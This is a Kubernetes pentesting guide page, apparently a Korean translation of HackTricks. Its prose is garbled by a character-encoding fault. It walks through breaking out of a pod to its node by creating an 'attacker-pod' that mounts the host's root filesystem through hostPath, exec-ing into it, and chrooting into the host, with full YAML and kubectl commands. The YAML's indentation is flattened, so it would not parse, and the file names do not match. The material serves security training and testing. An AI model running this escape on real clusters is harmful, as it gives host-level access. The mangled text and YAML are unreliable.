ìƒˆë¡œìš´ íŒŒë“œë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê²½ìš°, í•´ë‹¹ íŒŒë“œì—ì„œ ë…¸ë“œë¡œ íƒˆì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ yaml íŒŒì¼ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ íŒŒë“œë¥¼ ìƒì„±í•˜ê³ , ìƒì„±ëœ íŒŒë“œë¡œ ì „í™˜í•œ ë‹¤ìŒ ë…¸ë“œ ì‹œìŠ¤í…œìœ¼ë¡œ chrootí•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¯¸ ì¡´ì¬í•˜ëŠ” íŒŒë“œë¥¼ yaml íŒŒì¼ì˜ ì°¸ì¡°ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìœ¼ë©°, í•´ë‹¹ íŒŒë“œëŠ” ê¸°ì¡´ ì´ë¯¸ì§€ì™€ ê²½ë¡œë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> ë§Œì•½ íŠ¹ì • ë…¸ë“œì— podë¥¼ ìƒì„±í•´ì•¼ í•œë‹¤ë©´, ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ë…¸ë“œì˜ ë¼ë²¨ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
>
> `k get nodes --show-labels`
>
> ì¼ë°˜ì ìœ¼ë¡œ, kubernetes.io/hostname ë° node-role.kubernetes.io/masterëŠ” ì„ íƒí•˜ëŠ” ë° ì¢‹ì€ ë¼ë²¨ì…ë‹ˆë‹¤.
>
> [ì°¸ê³ ]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

ê·¸ëŸ° ë‹¤ìŒ ê³µê²©.yaml íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[ì›ë³¸ yaml ì†ŒìŠ¤](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ê·¸ í›„ì— podë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ì´ì œ ë‹¤ìŒê³¼ ê°™ì´ ìƒì„±ëœ podë¡œ ì „í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
ê·¸ë¦¬ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ ë…¸ë“œ ì‹œìŠ¤í…œìœ¼ë¡œ chrootí•©ë‹ˆë‹¤.
```bash
chroot /root /bin/bash
```
ì •ë³´ ì¶œì²˜: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## ì°¸ê³  ìë£Œ

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì‹¤ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
{% endhint %}
